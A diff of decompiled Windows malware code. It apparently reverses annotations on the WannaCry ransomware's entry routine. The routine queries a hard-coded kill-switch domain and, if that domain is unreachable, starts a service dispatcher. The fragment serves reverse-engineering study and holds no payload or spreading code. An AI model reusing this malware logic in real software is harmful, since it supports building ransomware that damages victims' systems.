@@ -5519,28 +5519,25 @@ int32_t function_408090(void) {
     *((int32_t *)(v3 + 8)) = (int32_t)&(g11);
     *((int32_t *)(g9 + 16)) = 0;
     *((int32_t *)(g9 + 20)) = 0;
-    StartServiceCtrlDispatcherA(hSCObject2);
-    
-    return;
+    return (StartServiceCtrlDispatcherA)(hSCObject2);
 }
 
 // Address range: 0x408140 - 0x4081cb
-// int32_t function_408140(int32_t a1)
-int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
+int32_t function_408140(int32_t a1) {
     int32_t v1 = 0; // bp-80
     (__asm_rep_movsd_memcpy)((char *)&(v1), "http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com", 14);
     char * v2 = NULL; // bp-100
-    HINTERNET hinternet = InternetOpenA(NULL, 1, NULL, NULL, 0); // 0x40817b
-    HINTERNET hinternet_return = InternetOpenUrlA(hinternet, (char *)&(v2), NULL, 0, -0x7c000000, 0); // 0x408194
+    int32_t * v3 = (InternetOpenA)(NULL, 1, NULL, NULL, 0); // 0x40817b
+    int32_t * v4 = (InternetOpenUrlA)(v3, (char *)&(v2), NULL, 0, -0x7c000000, 0); // 0x408194
     (InternetCloseHandle)(v3);
-    if ((hinternet_return != NULL)) {
+    if ((v4 != NULL)) {
         // 0x4081bc
-        InternetCloseHandle(hinternet_return);
+        (InternetCloseHandle)(v4);
         return 0;
     }
     // 0x4081a7
-    InternetCloseHandle(NULL);
-    function_408090();
+    (InternetCloseHandle)(NULL);
+    (function_408090)();
     return 0;
 }
 
